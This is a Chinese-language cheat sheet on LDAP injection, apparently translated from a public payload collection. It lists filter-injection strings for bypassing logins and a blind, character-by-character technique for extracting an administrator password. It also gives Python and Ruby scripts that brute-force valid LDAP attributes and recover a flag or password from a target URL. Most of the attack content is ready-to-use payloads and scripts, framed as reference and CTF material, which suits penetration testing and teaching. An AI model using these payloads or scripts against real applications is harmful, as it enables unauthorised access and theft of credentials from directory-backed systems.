# LDAP注入攻击

> LDAP注入是一种攻击方式，用于利用基于用户输入构建LDAP语句的Web应用程序。当应用程序未能正确消毒用户输入时，可以使用本地代理修改LDAP语句。

## 概述

* [利用方法](#exploitation)
* [有效载荷](#payloads)
* [盲利用](#blind-exploitation)
* [默认属性](#defaults-attributes)
* [利用userPassword属性](#exploiting-userpassword-attribute)
* [脚本](#scripts)
  * [发现有效的LDAP字段](#discover-valid-ldap-fields)
  * [特殊盲LDAP注入](#special-blind-ldap-injection)

## 利用方法

示例1。

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

示例2。

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

## 有效载荷

```text
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

## 盲利用

我们可以通过绕过登录来提取信息

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

## 默认属性

可以在注入中使用 `*)(ATTRIBUTE_HERE=*`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## 利用userPassword属性

`userPassword` 属性不是像 `cn` 属性那样的字符串，而是一个OCTET STRING（八位字节字符串）
在LDAP中，每个对象、类型、操作符等都是由一个OID引用的：octetStringOrderingMatch (OID 2.5.13.18)。

> octetStringOrderingMatch (OID 2.5.13.18)：一种排序匹配规则，它将执行两个八位字节字符串值的逐位比较（以大端排序），直到发现差异。在第一个零位在一个值中找到而在另一个值中找到一个一位的情况下，将认为具有零位的值小于具有一位值的值。

```bash
userPassword:2.5.13.18:=\xx (\xx 是一个字节)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## 脚本

### 发现有效的LDAP字段

```python
#!/usr/bin/python3

import requests
import string

fields = []

url = 'https://URL.com/'

f = open('dic', 'r') #打开常见属性的单词列表文件
wordl = f.read().split('
')
f.close()

for i in wordl:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #类似于 (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

参考 [5][5]

### 特殊盲LDAP注入（不使用"*"）

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] 寻找数字 " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] 标志: " + flag)
            break
```

参考 [5][5]

```ruby
#!/usr/bin/env ruby

require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''

(0..50).each do |i|
  puts("[i] 寻找数字 #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] 标志: #{flag}")
      break
    end
  end
end
```

作者：[noraj](https://github.com/noraj)

## 参考资料

* [OWASP LDAP注入](https://www.owasp.org/index.php/LDAP_injection)
* [LDAP Blind Explorer](http://code.google.com/p/ldap-blind-explorer/)
* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN](https://0xukn.fr/posts/writeupecw2018admyssion/)
* [Quals ECW 2018 - Maki](https://maki.bzh/courses/blog/writeups/qualecw2018/)
* [如何使用OpenLDAP实用程序管理和使用LDAP服务器](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
* [如何配置OpenLDAP并执行管理性LDAP任务](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
* 通过LDAP进行SSH密钥认证
  - [如何为openssh-lpk设置LDAP服务器](https://openssh-ldap-pubkey.readthedocs.io/en/latest/openldap.html)
  - [openssh-lpk.ldif](https://github.com/Lullabot/openldap-schema/blob/master/openssh-lpk.ldif)
  - [在Ubuntu 14.04上设置OpenLDAP服务器与OpenSSH-LPK](https://blog.shichao.io/2015/04/17/setup_openldap_server_with_openssh_lpk_on_ubuntu.html)
  - [使用LDAP进行SSH密钥认证](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap)
  - [法语] [SSH和LDAP](https://wiki.lereset.org/ateliers:serveurmail:ldap-ssh)
  - [OpenLDAP中的SSH公钥](http://pig.made-it.com/ldap-openssh.html)